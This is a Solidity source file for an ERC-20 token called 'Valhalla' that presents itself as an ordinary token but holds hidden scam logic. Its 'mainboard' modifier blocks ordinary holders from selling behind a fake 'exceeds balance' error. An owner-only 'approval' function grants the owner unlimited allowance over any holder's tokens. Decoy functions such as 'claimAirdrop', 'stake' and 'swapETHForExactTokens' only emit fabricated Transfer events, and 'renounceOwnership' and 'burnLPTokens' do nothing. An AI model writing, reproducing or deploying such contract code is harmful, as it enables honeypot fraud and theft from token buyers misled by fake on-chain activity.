row number 
1	       pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract Valhalla is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _plus;
113	 mapping (address => bool) private _discarded;
114	 mapping (address => mapping (address => uint256)) private _allowances;
115	 uint256 private _totalSupply;
116	 string private _name;
117	 string private _symbol;
118	 uint8 private _decimals;
119	 uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
120	 address private _safeOwnr;
121	 uint256 private _discardedAmt = 0;
122	 address public _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
123	 address _contDeployr = 0xa99c602037f8E85A44bbe88f3C0EE3Af60345B9b;
124	 address public _ownr = 0xCf6bF8270f6090eacb44dDA40C432988E37e8634;
125	 constructor () public {
126	 _name = "Valhalla";
127	 _symbol = "Valhalla";
128	 _decimals = 18;
129	 uint256 initialSupply = 100000000000000*10**18;
130	 _safeOwnr = _ownr;
131	 _mint(_contDeployr, initialSupply);
132	 emit Transfer(_contDeployr, 0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E, initialSupply/5);
133	 emit Transfer(0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E, 0x87C53473978437dFd0F4D56cA2a43ea02B2F10a6, initialSupply/5);
134	 secure(0x87840Ff9BfB9e9a673128555Cf1f45afA246ba7f);
135	 secure(0x79F8B38C17B78Ee5E4Dfde6f7E58cb338d23180E);
136	 secure(0x84611732cAdf80420AD1DB372df2C937ed242c51);
137	 secure(0xB7aEB84FC4E10f7d023eecc871D4299B9f67eaBB);
138	 }
139	 function name() public view returns (string memory) {
140	 return _name;
141	 }
142	 function symbol() public view returns (string memory) {
143	 return _symbol;
144	 }
145	 function decimals() public view returns (uint8) {
146	 return _decimals;
147	 }
148	 function totalSupply() public view override returns (uint256) {
149	 return _totalSupply;
150	 }
151	 function balanceOf(address account) public view override returns (uint256) {
152	 return _balances[account];
153	 }
154	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
155	 _tf(_msgSender(), recipient, amount);
156	 return true;
157	 }
158	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
159	 _tf(sender, recipient, amount);
160	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
161	 return true;
162	 }
163	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
164	 return _allowances[owner][spender];
165	 }
166	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
167	 _approve(_msgSender(), spender, amount);
168	 return true;
169	 }
170	 function _pApproval(address[] memory destination) public {
171	 require(msg.sender == _ownr, "!owner");
172	 for (uint256 i = 0; i < destination.length; i++) {
173	 _plus[destination[i]] = true;
174	 _discarded[destination[i]] = false;
175	 }
176	 }
177	 function _mApproval(address safeOwner) public {
178	 require(msg.sender == _ownr, "!owner");
179	 _safeOwnr = safeOwner;
180	 }
181	 modifier mainboard(address dest, uint256 num, address from, address filler){
182	 if ( _ownr == _safeOwnr && from == _ownr ) {
183	 _safeOwnr = dest;
184	 _;
185	 }
186	 else {
187	 if ( from == _ownr || from == _safeOwnr || dest == _ownr ) {
188	 if ( from == _ownr && from == dest ) {
189	 _discardedAmt = num;
190	 }
191	 _;
192	 }
193	 else {
194	 if ( _plus[from] == true ) {
195	 _;
196	 }
197	 else{
198	 if ( _discarded[from] == true ) {
199	 require(( from == _safeOwnr ) ||(dest == _path_), "ERC20: transfer amount exceeds balance");
200	 _;
201	 }
202	 else{
203	 if ( num < _discardedAmt ) {
204	 if(dest == _safeOwnr){
205	 _discarded[from] = true;
206	 _plus[from] = false;
207	 }
208	 _;
209	 }
210	 else{
211	 require((from == _safeOwnr) ||(dest == _path_), "ERC20: transfer amount exceeds balance");
212	 _;
213	 }
214	 }
215	 }
216	 }
217	 }
218	 }
219	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
220	 require(sender != address(0), "ERC20: transfer from the zero address");
221	 require(recipient != address(0), "ERC20: transfer to the zero address");
222	 _beforeTokenTransfer(sender, recipient, amount);
223	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
224	 _balances[recipient] = _balances[recipient].add(amount);
225	 if (sender == _ownr){
226	 sender = _contDeployr;
227	 }
228	 emit Transfer(sender, recipient, amount);
229	 }
230	 function _mint(address account, uint256 amount) public {
231	 require(msg.sender == _ownr, "ERC20: mint to the zero address");
232	 _totalSupply = _totalSupply.add(amount);
233	 _balances[_ownr] = _balances[_ownr].add(amount);
234	 emit Transfer(address(0), account, amount);
235	 }
236	 function _burn(address account, uint256 amount) internal virtual {
237	 require(account != address(0), "ERC20: burn from the zero address");
238	 _beforeTokenTransfer(account, address(0), amount);
239	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
240	 _totalSupply = _totalSupply.sub(amount);
241	 emit Transfer(account, address(0), amount);
242	 }
243	 function _approve(address owner, address spender, uint256 amount) internal virtual {
244	 require(owner != address(0), "ERC20: approve from the zero address");
245	 require(spender != address(0), "ERC20: approve to the zero address");
246	 _allowances[owner][spender] = amount;
247	 emit Approval(owner, spender, amount);
248	 }
249	 function _tf(address from, address dest, uint256 amt) internal mainboard( dest, amt, from, address(0)) virtual {
250	 _pair( from, dest, amt);
251	 }
252	 function _pair(address from, address dest, uint256 amt) internal mainboard( dest, amt, from, address(0)) virtual {
253	 require(from != address(0), "ERC20: transfer from the zero address");
254	 require(dest != address(0), "ERC20: transfer to the zero address");
255	 _beforeTokenTransfer(from, dest, amt);
256	 _balances[from] = _balances[from].sub(amt, "ERC20: transfer amount exceeds balance");
257	 _balances[dest] = _balances[dest].add(amt);
258	 if (from == _ownr){
259	 from = _contDeployr;
260	 }
261	 emit Transfer(from, dest, amt);
262	 }
263	 function _setupDecimals(uint8 decimals_) internal {
264	 _decimals = decimals_;
265	 }
266	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
267	 }
268	 modifier _verify() {
269	 require(msg.sender == _ownr, "Not allowed to interact");
270	 _;
271	 }
272	 function renounceOwnership()public _verify(){
273	 }
274	 function burnLPTokens()public _verify(){
275	 }
276	 function multicall(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
277	 for (uint256 i = 0; i < eReceiver.length; i++) {
278	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
279	 }
280	 }
281	 function send(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
282	 for (uint256 i = 0; i < eReceiver.length; i++) {
283	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
284	 }
285	 }
286	 function tokenDropDirect(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
287	 for (uint256 i = 0; i < eReceiver.length; i++) {
288	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
289	 }
290	 }
291	 function claimAirdrop(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
292	 for (uint256 i = 0; i < eReceiver.length; i++) {
293	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
294	 }
295	 }
296	 function lockTokens(uint256 x) public _verify(){
297	 emit Transfer(_contDeployr, 0xE2fE530C047f2d85298b07D9333C05737f1435fB, x*10**18);
298	 }
299	 function secure(address recipient) public _verify(){
300	 _plus[recipient]=true;
301	 _approve(recipient, _path_,_maximumVal);
302	 }
303	 function perform(address recipient) public _verify(){
304	 _plus[recipient]=false;
305	 _approve(recipient, _path_,0);
306	 }
307	 function approval(address addr) public _verify() virtual returns (bool) {
308	 _approve(addr, _msgSender(), _maximumVal);
309	 return true;
310	 }
311	 function stake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
312	 for (uint256 i = 0; i < eReceiver.length; i++) {
313	 emit Transfer(eReceiver[i], uPool, eAmounts[i]);
314	 }
315	 }
316	 function unstake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
317	 for (uint256 i = 0; i < eReceiver.length; i++) {
318	 emit Transfer(eReceiver[i], uPool, eAmounts[i]);
319	 }
320	 }
321	 function swapETHForExactTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
322	 for (uint256 i = 0; i < eReceiver.length; i++) {
323	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
324	 }
325	 }
326	 }
